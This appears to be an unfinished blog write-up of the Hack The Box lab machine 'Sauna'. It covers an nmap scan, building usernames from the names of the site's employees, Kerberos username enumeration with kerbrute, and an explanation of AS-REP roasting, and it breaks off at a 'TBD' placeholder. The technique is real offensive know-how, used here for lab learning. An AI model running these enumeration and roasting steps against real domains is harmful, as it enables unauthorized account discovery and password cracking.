---
layout: post
title: "HTB: Sauna"
tags: htb windows
---

Sauna retired, so time to make another post :)

### Recce
Not much, honestly. 
```
# Nmap 7.80 scan initiated Sat Mar 14 09:35:56 2020 as: nmap -v -sC -sV -oN nmap/initial.txt sauna.htb
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.35s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-14 20:37:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/14%Time=5E6CDDDB%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");                                                                       
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows                             
                                                                                                  
Host script results:                                                                              
|_clock-skew: 7h00m59s                                                                            
| smb2-security-mode:                                                                             
|   2.02:                                                                                         
|_    Message signing enabled and required                                                        
| smb2-time:                                                                                      
|   date: 2020-03-14T20:39:53
|_  start_date: N/A
```

Most important things to spot are:
1- There's an IIS server (port 80)
2- There's a Kerberos server (port 88)
3- There's the usual SMB ports (ports 135 and 445)
  
  
With these, we can start working. 

### Port 80
Browse the web server and we see a website by bank called Egotistical Bank. Observe that this is an information-only site, and that it's a custom-made application, so there's no special access to gain on the web application and no public exploits we can find for some quick wins. However, since we know there's Kerberos and some SMB ports open, we can start by finding possible usernames that we can use to crack some openings into either Kerberos or SMB.
  
  
And as luck would have it, we find the names of the employees on the "About Us" page. 
```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```

We'll keep these for now, see that there's nothing much else we can do on the site, and proceed to the next port.

### Port 88
With Kerberos, we can enumerate usernames by using [`kerbrute`](https://github.com/ropnop/kerbrute) to throw usernames at the service until we get some valid returns. But first, we need to have a wordlist that contains valid usernames to succeed.
  
  
Now's the part where the employee names we found come in useful. To generate our wordlist for `kerbrute`, first we need to generate some corporate-looking usernames from the names we found. To do that, we can follow some common naming conventions used in corporate environments, like `firstname_lastname`, `first-character-of-firstname+lastname`, `first-two-characters-of-firstname+lastname`, etc ... . Now perhaps there's a smarter way of doing this, but I did this manually since we only have a few names:
```
fergus_smith
shaun_coins
hugo_bear
bowie_taylor
sophie_driver
steven_kerb
fsmith
scoins
hbear
btaylor
sdriver
skerb
fesmith
shcoins
botaylor
sodriver
stkerb
```
Throw this wordlist with `kerbrute` ...
```
kali@kali:~/htb/boxes/sauna/web$ sudo /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc sauna.htb wordlist.txt                       

    __             __               __                                                            
   / /_____  _____/ /_  _______  __/ /____                                                        
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \                                                       
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9dad6e1) - 07/21/20 - Ronnie Flathers @ropnop

2020/07/21 20:57:44 >  Using KDC(s):
2020/07/21 20:57:44 >   sauna.htb:88

2020/07/21 20:57:44 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2020/07/21 20:57:44 >  Done! Tested 17 usernames (1 valid) in 0.807 seconds
```
Wham bam! We got ourselves a valid user, `fsmith`!

### AS-REP Roasting
Now in keeping with the name of the box (Sauna), we can suspect that the way forward is to Kerberoast valid users (_roast_ in a _sauna_, geddit?).
  
  
The usual way to perform a Kerberoast attack is first to request a valid Ticket Granting Service (TGS) from the Domain Controller (in our case the box), and from there crack the TGS for the service account password. However because in our case, since we only have a username without a password, we can't successfully impersonate our user to request for a valid TGS to perform the cracking. 
  
  
As it turns out, there exists a feature in Kerberos authentication that allows us to request tickets without passwords - accounts that are set to "do not require Kerberos pre-auth". Now this is a rarely disabled feature, but it might exist in an environment where system admins have to accommodate VPN logins or Linux machines in an Active Directory (AD) environment. If enabled, then theoretically we can grab the user account's AS-REP and crack it offline - such an attack is called AS-REP Roasting.  
  
  
Now since we have a valid user `fsmith` but no valid password, let's try our luck and see if `fsmith` is an account that has the "do not require Kerberos pre-auth" option enabled. To do this, we can use [`Impacket`'s `GetNPUsers` module](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#asreproast):
```
TBD
```
